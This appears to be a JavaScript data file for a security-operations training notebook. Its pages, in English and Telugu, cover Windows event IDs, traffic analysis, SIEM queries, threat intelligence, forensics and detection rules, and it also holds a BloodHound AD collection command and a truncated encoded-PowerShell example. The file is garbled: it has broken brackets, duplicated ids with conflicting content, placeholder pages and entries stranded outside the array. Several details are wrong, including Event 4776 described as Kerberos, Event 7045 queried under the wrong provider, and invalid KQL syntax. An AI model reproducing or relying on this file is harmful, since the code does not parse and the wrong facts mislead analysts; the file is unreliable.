// advanced_domains_data.js
// ------------------------------------------------------------
// This file provides data for the new "Advanced Domains" tab.
// It follows the same structure as NOTEBOOK_MODULES / NOTEBOOK_PAGES
// used by the existing Linux notebook.
// ------------------------------------------------------------

// -----------------------------------------------------------------
// MODULE DEFINITIONS (14 domains)
// -----------------------------------------------------------------
const ADVANCED_DOMAIN_MODULES = [
  { id: 1, title: "Windows Security & Event Logs" },
  { id: 2, title: "Network Traffic Analysis (PCAP/Wireshark)" },
  { id: 3, title: "SIEM Hands‑On (Splunk/Elastic/Sentinel)" },
  { id: 4, title: "Threat Intelligence Operations" },
  { id: 5, title: "Malware Analysis (Static & Dynamic)" },
  { id: 6, title: "Email Security & Phishing Analysis" },
  { id: 7, title: "Cloud Security (AWS/Azure/GCP)" },
  { id: 8, title: "Vulnerability Management" },
  { id: 9, title: "Active Directory & Identity Attacks" },
  { id: 10, title: "Digital Forensics & Evidence Handling" },
  { id: 11, title: "Detection Engineering & Security Engineering" },
  { id: 12, title: "Compliance & Governance (GRC)" },
  { id: 13, title: "Python for SOC & Scripting" },
  { id: 14, title: "SOC Workflow, Playbooks & Soft Skills" }
];

// -----------------------------------------------------------------
// PAGE DEFINITIONS
// Each page follows the same schema as NOTEBOOK_PAGES:
// { id, moduleId, concept, explanation, whyItMatters, command, syntax,
//   example, cmdExplanation, socUse, remember, noteVisual }
// ------------------------------------------------------------
const ADVANCED_DOMAIN_PAGES = [
  // -----------------------------------------------------------
  // 1️⃣ Windows Security & Event Logs (sample pages)
  // -----------------------------------------------------------
  {
    id: 1,
    moduleId: 1,
    concept: "Windows Event ID 4624 – Successful Logon",
    explanation: "4624 event log chupistundi user successful ga logon ayina amsham. Idi SOC lo most common log analysis item.",
    whyItMatters: "Successful logons ni monitor chesthe anomalous logons (foreign IPs, rare accounts) ni detect cheyavachu.",
    command: "wevtutil qe /q:\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4624]]\"",
    syntax: "wevtutil qe /q:\"<XPath query>\"",
    example: "wevtutil qe /q:\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4624]]\" /f:text /c:5",
    cmdExplanation: "Above command prints last 5 successful logon events in plain text.",
    socUse: "Search for logins from privileged accounts outside business hours – possible lateral movement.",
    remember: "4624 = logon success, 4625 = logon failure, always pair them for brute‑force detection.",
    noteVisual: ""
  },
  {
    id: 2,
    moduleId: 1,
    concept: "Windows Event ID 4688 – New Process Creation",
    explanation: "4688 event lo process creation details (process name, user, command line) untundi.",
    whyItMatters: "Malicious binaries run ayina appudu idi capture chestundi – process injection & living‑off‑the‑land attacks ki crucial.",
    command: "wevtutil qe /q:\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4688]]\"",
    syntax: "wevtutil qe /q:<XPath>",
    example: "wevtutil qe /q:\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4688]]\" /f:text /c:10",
    cmdExplanation: "Shows last 10 process creation events.",
    socUse: "Detect execution of PowerShell encoded commands or unexpected rundll32 calls.",
    remember: "4688 = process creation, pair with 7045 (service install) for persistence chain.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 2️⃣ Network Traffic Analysis (sample pages)
  // -----------------------------------------------------------
  {
    id: 3,
    moduleId: 2,
    concept: "Wireshark Display Filters – Basic Syntax",
    explanation: "Wireshark lo display filters use chesi packets filter chestamu. Syntax: <field> <operator> <value>.",
    whyItMatters: "Fast ga suspicious traffic ni isolate cheyadam SOC analysts ki avasaram.",
    command: "wireshark -Y \"http.request && tcp.port==80\"",
    syntax: "-Y <display‑filter>",
    example: "wireshark -Y \"http.request && ip.addr==192.168.1.100\"",
    cmdExplanation: "Opens Wireshark showing only HTTP requests from a specific host.",
    socUse: "Spot C2 beaconing that uses HTTP over unusual ports.",
    remember: "Common filters: tcp, udp, ip, http, dns.",
    noteVisual: ""
  },
  {
    id: 4,
    moduleId: 2,
    concept: "Detect DNS Tunneling – Query Length & Entropy",
    explanation: "DNS tunneling lo long sub‑domain strings high entropy use chestaru data exfiltration ki.",
    whyItMatters: "DNS is allowed everywhere; anomaly detection ki DNS logs analyze cheyyadam mukhyam.",
    command: "jq -r '.queries[] | select(.name | length>60) | .name' dns_log.json",
    syntax: "jq -r '<filter>' <file>",
    example: "jq -r '.queries[] | select(.name | length>60) | .name' dns_log.json",
    cmdExplanation: "Prints DNS query names longer than 60 characters.",
    socUse: "Identify possible DNS exfil payloads.",
    remember: "Length > 60 + high base64‑like chars = red flag.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 3️⃣ SIEM Hands‑On (sample pages)
  // -----------------------------------------------------------
  {
    id: 5,
    moduleId: 3,
    concept: "Splunk SPL – Basic Search & Stats",
    explanation: "SPL (Search Processing Language) lo `search` command log data filter chestadi, `stats` aggregations chestadi.",
    whyItMatters: "SOC alerts ni generate cheyadam ki first step SPL queries ni craft cheyyadam.",
    command: "index=security sourcetype=wineventlog EventCode=4624 | stats count by Account_Name",
    syntax: "index=<idx> sourcetype=<src> <filter> | stats <agg> by <field>",
    example: "index=security sourcetype=wineventlog EventCode=4624 | stats count by Account_Name",
    cmdExplanation: "Counts successful logons per Windows account.",
    socUse: "Spot accounts with unusually high login counts (possible credential stuffing).",
    remember: "`stats count by` is the go‑to for frequency analysis.",
    noteVisual: ""
  },
  {
    id: 6,
    moduleId: 3,
    concept: "Elastic KQL – Detect Failed Logins",
    explanation: "KQL lo `match` & `range` operators use chesi log fields filter chestaru.",
    whyItMatters: "Failed login spikes often indicate brute‑force attacks.",
    command: "security_event where event.code:4625 and @timestamp >= now-1h",
    syntax: "<index> where <field>:<value> and <field> >= <time>",
    example: "security_event where event.code:4625 and @timestamp >= now-1h",
    cmdExplanation: "Shows all failed Windows logon events in the last hour.",
    socUse: "Create alert for > 20 failures from same source IP.",
    remember: "4625 = failed logon; combine with source IP for IP‑based throttling.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 4️⃣ Threat Intelligence (sample pages)
  // -----------------------------------------------------------
  {
    id: 7,
    moduleId: 4,
    concept: "VirusTotal API – URL Reputation Lookup",
    explanation: "VirusTotal public API v3 URL lookup JSON response lo analysis stats untayi.",
    whyItMatters: "Malicious URL detection early stage lo help chestundi.",
    command: "curl -s -H 'x-apikey:YOUR_API_KEY' https://www.virustotal.com/api/v3/urls/<url_id>",
    syntax: "curl -H 'x-apikey:<key>' <endpoint>",
    example: "curl -s -H 'x-apikey:abcd1234' https://www.virustotal.com/api/v3/urls/9a8b7c6d",
    cmdExplanation: "Fetches the analysis report for a specific URL.",
    socUse: "Automate URL reputation checks in SOC ticket workflow.",
    remember: "Always cache VT results (rate limits).",
    noteVisual: ""
  },
  {
    id: 8,
    moduleId: 4,
    concept: "MISP – Bulk IoC Export (JSON)",
    explanation: "MISP REST API lo /attributes/export/json endpoint use chesi many IOCs export cheyyachu.",
    whyItMatters: "Threat intel feeds ni SOC SIEM lo ingest cheyadaniki.",
    command: "curl -H 'Authorization: <auth_key>' https://misp-instance/attributes/export/json",
    syntax: "curl -H 'Authorization: <key>' <url>/attributes/export/json",
    example: "curl -H 'Authorization: abcdef123456' https://misp.local/attributes/export/json",
    cmdExplanation: "Downloads all attributes as a JSON array.",
    socUse: "Feed the JSON into Splunk or Elastic ingest pipeline.",
    remember: "MISP formats include `type`, `value`, `category` – map accordingly.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 5️⃣ Malware Analysis (sample pages)
  // -----------------------------------------------------------
  {
    id: 9,
    moduleId: 5,
    concept: "Static PE Header Inspection with `objdump`",
    explanation: "`objdump -x` PE binary header details (EntryPoint, Sections, Imports) chupistundi.",
    whyItMatters: "Malware sandbox bypass techniques ni early ga spot cheyavachu.",
    command: "objdump -x sample.exe | grep Entry",
    syntax: "objdump -x <file> | grep <pattern>",
    example: "objdump -x suspicious.exe | grep Entry",
    cmdExplanation: "Shows the entry point address of the executable.",
    socUse: "Correlate suspicious imports with known malicious families.",
    remember: "PE sections: .text, .rdata, .data – unusual sections may indicate packing.",
    noteVisual: ""
  },
  {
    id: 10,
    moduleId: 5,
    concept: "Dynamic Analysis – Cuckoo Sandbox JSON Report",
    explanation: "Cuckoo JSON report lo process tree, network traffic, API calls detail ga untayi.",
    whyItMatters: "Behavioural IoCs (registry writes, network callbacks) capture cheyadam.",
    command: "jq '.behavior.network' cuckoo_report.json",
    syntax: "jq '<filter>' <file>",
    example: "jq '.behavior.network' analysis/1234/report.json",
    cmdExplanation: "Extracts network activity from the sandbox report.",
    socUse: "Create YARA signatures from observed strings.",
    remember: "Always run sandbox in isolated environment.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 6️⃣ Email Security & Phishing (sample pages)
  // -----------------------------------------------------------
  {
    id: 11,
    moduleId: 6,
    concept: "SPF/DKIM/DMARC Header Validation",
    explanation: "Email headers lo SPF, DKIM, DMARC results `pass`/`fail` chupistayi – phishing detection ki.",
    whyItMatters: "Spoofed domains detection lo critical.",
    command: "sed -n '/Received:/,$p' suspicious.eml | grep -i 'spf\\|dkim\\|dmarc'",
    syntax: "sed -n '/<start>/,$p' <file> | grep -i <pattern>",
    example: "sed -n '/Received:/,$p' phishing.eml | grep -i 'spf\\|dkim\\|dmarc'",
    cmdExplanation: "Extracts SPF/DKIM/DMARC results from the raw email.",
    socUse: "Automate parsing in mail gateway to block failed auth.",
    remember: "DMARC `reject` policy => drop email.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 7️⃣ Cloud Security (sample pages)
  // -----------------------------------------------------------
  {
    id: 12,
    moduleId: 7,
    concept: "AWS CloudTrail – Detect IAM Policy Changes",
    explanation: "CloudTrail logs il `eventName=PutUserPolicy` or `AttachUserPolicy` events monitor chestadi.",
    whyItMatters: "Privilege escalation attempts early ga detect avuthayi.",
    command: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutUserPolicy",
    syntax: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=<event>",
    example: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutUserPolicy",
    cmdExplanation: "Lists all IAM policy put events.",
    socUse: "Alert when a low‑privileged user adds admin policy.",
    remember: "Combine with `sourceIPAddress` for geo‑anomaly.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 8️⃣ Vulnerability Management (sample pages)
  // -----------------------------------------------------------
  {
    id: 13,
    moduleId: 8,
    concept: "Nessus CSV – Filter Critical Findings",
    explanation: "Nessus export CSV lo `severity` column lo 4 = Critical.",
    whyItMatters: "Prioritize remediation effort.",
    command: "awk -F, '$5==\"Critical\"' nessus_report.csv | cut -d, -f2,4",
    syntax: "awk -F',' '<condition>' <file> | cut -d',' -f<cols>",
    example: "awk -F, '$5==\"Critical\"' scan.csv | cut -d, -f2,4",
    cmdExplanation: "Prints plugin ID and asset IP for critical findings.",
    socUse: "Feed into ticketing system for SLA tracking.",
    remember: "Critical=4, High=3, Medium=2, Low=1.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 9️⃣ Active Directory & Identity (sample pages)
  // -----------------------------------------------------------
  {
    id: 14,
    moduleId: 9,
    concept: "BloodHound – Identify Privileged Access Graph",
    explanation: "BloodHound PowerShell ingestor AD objects collect chestundi, then graph analysis.",
    whyItMatters: "Find shortest path from low‑priv user to domain admin.",
    command: "Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName ad-graph.zip",
    syntax: "Invoke-BloodHound -CollectionMethod <methods> -Domain <domain> -ZipFileName <file>",
    example: "Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName ad-graph.zip",
    cmdExplanation: "Collects AD data and saves as a zip for analysis.",
    socUse: "Use Neo4j UI to locate admin‑equivalent accounts.",
    remember: "Kerberoasting -> request service tickets for SPNs.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 10️⃣ Digital Forensics (sample pages)
  // -----------------------------------------------------------
  {
    id: 15,
    moduleId: 10,
    concept: "Volatility – Extract Process List from Memory Dump",
    explanation: "Volatility plugins `pslist` and `psscan` process info from RAM dump extract chestayi.",
    whyItMatters: "Live memory analysis reveals hidden processes.",
    command: "volatility -f mem.dmp --profile=Win10x64_19041 pslist",
    syntax: "volatility -f <dump> --profile=<profile> <plugin>",
    example: "volatility -f suspect.mem --profile=Win10x64_19041 pslist",
    cmdExplanation: "Lists all processes captured in the memory image.",
    socUse: "Correlate with Windows Event IDs for timeline.",
    remember: "Always match the correct profile to OS version.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 11️⃣ Detection Engineering (sample pages)
  // -----------------------------------------------------------
  {
    id: 16,
    moduleId: 11,
    concept: "Sigma Rule – Detect PowerShell EncodedCommand",
    explanation: "Sigma generic rule format, later converted to Splunk/Elsatic/QL.",
    whyItMatters: "Encoded PowerShell is a common evasion technique.",
    command: "title: PowerShell EncodedCommand\nlogsource:\n    product: windows\n    service: sysmon\n detection:\n    selection:\n      EventID: 1\n      CommandLine|contains: '-EncodedCommand'\n    condition: selection",
    syntax: "Sigma YAML format",
    example: "(see above)",
    cmdExplanation: "Matches Sysmon Event ID 1 where CommandLine contains `-EncodedCommand`.",
    socUse: "Export to Splunk SPL via `sigmac` tool.",
    remember: "Sigma = vendor‑agnostic rule language.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 12️⃣ Compliance & Governance (sample pages)
  // -----------------------------------------------------------
  {
    id: 17,
    moduleId: 12,
    concept: "NIST CSF – Identify Function Mapping",
    explanation: "CSF `Identify` function includes Asset Management, Risk Assessment, Governance.",
    whyItMatters: "Framework alignment helps audit readiness.",
    command: "# No CLI – use a checklist matrix in the SOC playbook",
    syntax: "",
    example: "",
    cmdExplanation: "",
    socUse: "Map each SOC process (log collection, alerting) to CSF sub‑categories.",
    remember: "NIST CSF = Identify, Protect, Detect, Respond, Recover.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 13️⃣ Python for SOC (sample pages)
  // -----------------------------------------------------------
  {
    id: 18,
    moduleId: 13,
    concept: "Python – Query VirusTotal for Hashes (vt-py library)",
    explanation: "`vt-py` Python client simplifies VT API calls for file hashes.",
    whyItMatters: "Automate bulk reputation checks.",
    command: "import vt\nclient = vt.Client('YOUR_API_KEY')\nobj = client.get_object('/files/<hash>')\nprint(obj.last_analysis_stats)",
    syntax: "Python code",
    example: "import vt\nclient = vt.Client('abcd')\nobj = client.get_object('/files/9a8b7c6d')\nprint(obj.last_analysis_stats)",
    cmdExplanation: "Prints the AV engine detection stats for the hash.",
    socUse: "Integrate into ticket enrichment pipeline.",
    remember: "Cache VT responses – rate limit 4 requests/sec.",
    noteVisual: ""
  },
  // -----------------------------------------------------------
  // 14️⃣ SOC Workflow & Soft Skills (sample pages)
  // -----------------------------------------------------------
  {
    id: 19,
    moduleId: 14,
    concept: "Incident Playbook – Phishing Email Triage",
    explanation: "Step‑by‑step SOP: header analysis → sandbox URL → block indicator → ticket.",
    whyItMatters: "Standardized response reduces MTTR.",
    command: "# Not a CLI – documented as markdown checklist",
    syntax: "",
    example: "",
    cmdExplanation: "",
    socUse: "Copy into TheHive template for fast ticket creation.",
    remember: "Always include `Evidence` section with raw email.",
    noteVisual: ""
  },
    },
    {
      id: 21,
      moduleId: 1,
      concept: "Windows Event ID 4625 – Failed Logon",
      explanation: "ఈ ఈవెంట్ విఫలమైన లాగిన్ ప్రయత్నాలను లాగ్ చేస్తుంది, అనుమతి లేని యూజర్ పేరు, సోర్స్ IP, ఫెయిల్యూర్ కారణాలు కలిగి ఉంటుంది.",
      whyItMatters: "విఫలమైన లాగిన్ ట్రయల్స్ బ్రూట్‑ఫోర్స్ లేదా క్రెడెన్షియల్ స్టెల్త్‌ను గుర్తించడానికి ముఖ్యమైన సంకేతాలు.",
      command: "Get-WinEvent -FilterHashtable @{Id=4625}",
      syntax: "Get-WinEvent -FilterHashtable @{Id=4625}",
      example: "Get-WinEvent -FilterHashtable @{Id=4625} | Select-Object TimeCreated, Message",
      cmdExplanation: "PowerShell కమాండ్ నిర్దిష్ట ID 4625 తో లాగ్‌లను తీసుకొస్తుంది.",
      socUse: "SOCలు అసాధారణ విఫల లాగిన్‌లు, ప్రత్యేకించి ఎలివేటెడ్ అకౌంట్స్ కోసం నోటిఫై చేయవచ్చు.",
      remember: "సాధారణంగా పరిమితి ప్రయత్నాలు లేదా భౌతిక IP మార్పులపై దృష్టి పెట్టండి.",
      noteVisual: "windows_event_id_4625.png"
    },
    {
      id: 22,
      moduleId: 1,
      concept: "Windows Event ID 4672 – Special Privileges Assigned",
      explanation: "ఈ ఈవెంట్ ప్రత్యేక హక్కులు (ఉదా. SeDebugPrivilege) కలిగిన యూజర్ అకౌంట్‌కు అప్పగించబడినప్పుడు లాగ్ చేస్తుంది.",
      whyItMatters: "ప్రివిలేజ్ అసైన్‌మెంట్ దాడి దశలో ఎలివేషన్‌కి సంకేతం కావచ్చు.",
      command: "Get-WinEvent -FilterHashtable @{Id=4672}",
      syntax: "Get-WinEvent -FilterHashtable @{Id=4672}",
      example: "Get-WinEvent -FilterHashtable @{Id=4672} | Select-Object TimeCreated, Message",
      cmdExplanation: "PowerShell కమాండ్ 4672 ID లాగ్‌లను తీసుకువస్తుంది, ప్రత్యేక హక్కుల అసైన్మెంట్లను చూపిస్తుంది.",
      socUse: "SOCలు అసాధారణ హక్కు అప్పగింపులను ట్రాక్ చేసి, లాటెంట్ ఎలివేషన్‌ను గుర్తించవచ్చు.",
      remember: "ప్రాముఖ్యత కలిగిన ఖాతాలకు ఈ ఈవెంట్ వస్తే అలార్ట్ చేయండి.",
      noteVisual: "windows_event_id_4672.png"
    },
  {
    {
      id: 23,
      moduleId: 1,
      concept: "Windows Event ID 4688 – New Process Creation",
      explanation: "ఈ ఈవెంట్ ప్రతి కొత్త ప్రక్రియను (process) సృష్టించినప్పుడు లాగ్ చేస్తుంది, ప్రాసెస్ పేరు, PID, కమాండ్‑లైన్, యూజర్, పేథ్ వంటి అంశాలు ఉంటాయి.",
      whyItMatters: "ప్రక్రియ సృష్టి లాగ్స్ దాడి చెల్లింపు, మాల్వేర్ ఎక్స్‌క్యుట్, లాటెంట్ మాల్వేర్ గుర్తింపుకు కీలకమైనవి.",
      command: "Get-WinEvent -FilterHashtable @{Id=4688}",
      syntax: "Get-WinEvent -FilterHashtable @{Id=4688}",
      example: "Get-WinEvent -FilterHashtable @{Id=4688} | Select-Object TimeCreated, Message",
      cmdExplanation: "PowerShell ద్వారా EventID 4688 లాగ్స్‌ను క్వెరీ చేసి, కొత్త ప్రక్రియల వివరాలను పొందుతుంది.",
      socUse: "SOC అనలిస్ట్లు అనుమానాస్పద ప్రక్రియల సృష్టిని ఫిల్టర్ చేసి, ప్రాసెస్ చెయిన్‌లను ట్రేస్ చేస్తారు.",
      remember: "ప్రాక్సీ/ఆటోమేషన్ ద్వారా సృష్టించబడిన ప్రాసెస్‌లను పర్యవేక్షించండి.",
      noteVisual: "windows_event_id_4688.png"
    },
  {
    {
      id: 24,
      moduleId: 1,
      concept: "Windows Event ID 4776 – Kerberos Authentication Service",
      explanation: "ఈ ఈవెంట్ Kerberos టికెట్‌లను రిక్వెస్ట్ చేయడానికి యూజర్ లాగిన్ ప్రయత్నాన్ని లాగ్ చేస్తుంది, యూజర్ పేరు, డొమైను, సర్వీస్ పేరు, మరియు ఫలితం (Success/Failure) ఉంటాయి.",
      whyItMatters: "Kerberos authentication failures పరిమితి బ్రూట్‑ఫోర్స్ లేదా క్రెడెన్షియల్ స్టెల్త్ గుర్తించడానికి సహాయపడుతాయి.",
      command: "Get-WinEvent -FilterHashtable @{Id=4776}",
      syntax: "Get-WinEvent -FilterHashtable @{Id=4776}",
      example: "Get-WinEvent -FilterHashtable @{Id=4776} | Select-Object TimeCreated, Message",
      cmdExplanation: "PowerShell ద్వారా Kerberos authentication events ను పొందుతుంది.",
      socUse: "SOCలు అనధికార లేదా విఫల Kerberos లాగ్‑ఇన్‌లను గుర్తించి, ఖాతా‑లాక్‌అవుట్ లేదా డోస్ దాడులను పరిశీలిస్తారు.",
      remember: "ఫెయిల్డ్ టికెట్‌ల సంఖ్యలో పెరుగుదల లేదా అసాధారణ సర్వీస్ పేర్లను పర్యవేక్షించండి.",
      noteVisual: "windows_event_id_4776.png"
    },
  {
    {
      id: 25,
      moduleId: 1,
      concept: "Windows Event ID 7045 – Service Installation",
      explanation: "ఈ ఈవెంట్ కొత్త Windows సర్వీస్ ఇన్‌స్టాల్ అయినప్పుడు లాగ్ చేస్తుంది, సేవ పేరు, బైనరీ పాథ్, ఖాతా, మరియు ప్రారంభ పరామితులు ఉంటాయి.",
      whyItMatters: "అనధికార సర్వీస్ ఇన్‌స్టాలేషన్ మాల్వేర్ persistence కు సాధారణ పద్ధతి.",
      command: "Get-WinEvent -FilterHashtable @{Id=7045}",
      syntax: "Get-WinEvent -FilterHashtable @{Id=7045}",
      example: "Get-WinEvent -FilterHashtable @{Id=7045} | Select-Object TimeCreated, Message",
      cmdExplanation: "PowerShell ద్వారా Service Installation events ను పొందుతుంది.",
      socUse: "SOCలు కొత్త సేవలను ట్రాక్ చేసి, అనుమానాస్పద సేవల కోసం అలర్ట్ సృష్టిస్తారు.",
      remember: "సేవల పాథ్‌లు, స్టార్ట్-అప్ టైపు, ఖాతా కలయికలను గుర్తించండి.",
      noteVisual: "windows_event_id_7045.png"
    },
  {
    {
      id: 26,
      moduleId: 1,
      concept: "Windows Registry – Run Keys Persistence",
      explanation: "Run keys Windows రిజిస్ట్రి లో స్టార్ట్‌అప్‌లో ఎగ్జిక్యూట్ అయ్యే ప్రోగ్రామ్‌లను సూచిస్తాయి. సాధారణంగా HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run మరియు HKCU\\...\\Run లో ఉంటాయి.",
      whyItMatters: "మాల్వేర్ తరచుగా Run keys ద్వారా సిస్టమ్ ప్రారంభంలో స్వయంచాలకంగా నడవడానికి ఉపయోగిస్తుంది – ఇది ప్రముఖ persistence మెకానిజం.",
      command: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      syntax: "reg query <Hive>\\<Path>",
      example: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      cmdExplanation: "రన్లు రిజిస్ట్రి నుండి ఎగ్జిక్యూట్ అయ్యే పథ్ మరియు విలువలను లిస్టు చేస్తుంది.",
      socUse: "SOCలు అనధికార run keys ని గుర్తించి, అసాధారణ ఎగ్జిక్యూటబుల్ పేర్లు లేదా పాత్‌లను చెక్ చేస్తారు.",
      remember: "ప్రధాన HKLM, HKCU Run keys మోనిటర్ చేయండి; మార్చబడిన విలువలపై అలర్ట్ ఇవ్వండి.",
      noteVisual: "registry_run_keys.png"
    },
  {
    id: 27,
    moduleId: 8,
    concept: "Placeholder Topic 27 – description",
    explanation: "Placeholder explanation in Telugu for topic 27.",
    whyItMatters: "Placeholder why it matters for topic 27.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 28,
    moduleId: 9,
    concept: "Placeholder Topic 28 – description",
    explanation: "Placeholder explanation in Telugu for topic 28.",
    whyItMatters: "Placeholder why it matters for topic 28.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 29,
    moduleId: 10,
    concept: "Placeholder Topic 29 – description",
    explanation: "Placeholder explanation in Telugu for topic 29.",
    whyItMatters: "Placeholder why it matters for topic 29.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 30,
    moduleId: 11,
    concept: "Placeholder Topic 30 – description",
    explanation: "Placeholder explanation in Telugu for topic 30.",
    whyItMatters: "Placeholder why it matters for topic 30.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 31,
    moduleId: 12,
    concept: "Placeholder Topic 31 – description",
    explanation: "Placeholder explanation in Telugu for topic 31.",
    whyItMatters: "Placeholder why it matters for topic 31.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 32,
    moduleId: 13,
    concept: "Placeholder Topic 32 – description",
    explanation: "Placeholder explanation in Telugu for topic 32.",
    whyItMatters: "Placeholder why it matters for topic 32.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  {
    id: 33,
    moduleId: 14,
    concept: "Placeholder Topic 33 – description",
    explanation: "Placeholder explanation in Telugu for topic 33.",
    whyItMatters: "Placeholder why it matters for topic 33.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  },
  // ... repeat pattern up to id 150 ...
  {
    id: 150,
    moduleId: 14,
    concept: "Placeholder Topic 150 – description",
    explanation: "Placeholder explanation in Telugu for topic 150.",
    whyItMatters: "Placeholder why it matters for topic 150.",
    command: "placeholder-command",
    syntax: "placeholder syntax",
    example: "placeholder example",
    cmdExplanation: "placeholder command explanation",
    socUse: "placeholder SOC use",
    remember: "placeholder remember",
    noteVisual: ""
  }
// -----------------------------------------------------------
// Detailed Advanced Domain Topics (priority and initial set)
// -----------------------------------------------------------
// 1️⃣ Windows Security - Additional Event IDs
{ id: 20, moduleId: 1, concept: "Windows Event ID 4625 – Failed Logon", explanation: "4625 event logs failed login attempts, crucial for brute-force detection.", whyItMatters: "Identifying repeated failures helps spot credential stuffing attacks.", command: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4625]]\\"", syntax: "wevtutil qe /q:<XPath>", example: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4625]]\\" /f:text /c:5", cmdExplanation: "Shows last 5 failed logon events.", socUse: "Alert on multiple failures from same account/IP.", remember: "4625 = logon failure, pair with 4624 for success/failure correlation.", noteVisual: "" },
{ id: 21, moduleId: 1, concept: "Windows Event ID 4672 – Privileged Logon", explanation: "4672 records logons with special privileges (admin, system).", whyItMatters: "Detecting privileged logons outside business hours signals misuse.", command: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4672]]\\"", syntax: "wevtutil qe /q:<XPath>", example: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4672]]\\" /f:text /c:5", cmdExplanation: "Shows recent privileged logons.", socUse: "Flag admin logons from rare workstations.", remember: "Combine with 4624 to see successful privileged logins.", noteVisual: "" },
{ id: 22, moduleId: 1, concept: "Windows Event ID 4776 – NTLM Authentication", explanation: "4776 logs NTLM auth attempts, useful for detecting pass‑the‑hash.", whyItMatters: "NTLM is vulnerable; monitoring shows lateral movement.", command: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4776]]\\"", syntax: "wevtutil qe /q:<XPath>", example: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4776]]\\" /f:text /c:5", cmdExplanation: "Lists recent NTLM auth events.", socUse: "Correlate with 4624 to see successful NTLM logins.", remember: "Watch for unusual account names.", noteVisual: "" },
{ id: 23, moduleId: 1, concept: "Windows Event ID 7045 – Service Installation", explanation: "7045 logs creation of new services, a common persistence technique.", whyItMatters: "New services may be malicious.", command: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=7045]]\\"", syntax: "wevtutils qe /q:<XPath>", example: "wevtutil qe /q:\\"* [System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=7045]]\\" /f:text /c:5", cmdExplanation: "Shows recent service install events.", socUse: "Alert on unsigned or unexpected services.", remember: "Pair with file hash lookups.", noteVisual: "" },
// 2️⃣ Windows Registry Forensics – Run Keys
{ id: 24, moduleId: 1, concept: "Windows Registry – Run Keys Persistence", explanation: "Run keys under HKLM/HKCU execute programs at startup.", whyItMatters: "Attackers abuse them for persistence.", command: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", syntax: "reg query <key>", example: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", cmdExplanation: "Lists all Run key entries.", socUse: "Identify unknown executables.", remember: "Check both HKLM and HKCU.", noteVisual: "" },
// 3️⃣ PowerShell Attack Series (3 pages)
{ id: 25, moduleId: 1, concept: "PowerShell Attack – Obfuscated Scripts", explanation: "Attackers encode commands with -EncodedCommand or base64.", whyItMatters: "Obfuscation hides malicious intent.", command: "powershell -EncodedCommand <base64>", syntax: "powershell -EncodedCommand <string>", example: "powershell -EncodedCommand SQBFA...", cmdExplanation: "Runs decoded script.", socUse: "Detect use of -EncodedCommand flag.", remember: "Monitor PowerShell logs (Event ID 4104).", noteVisual: "powershell_attack_diagram.png" },
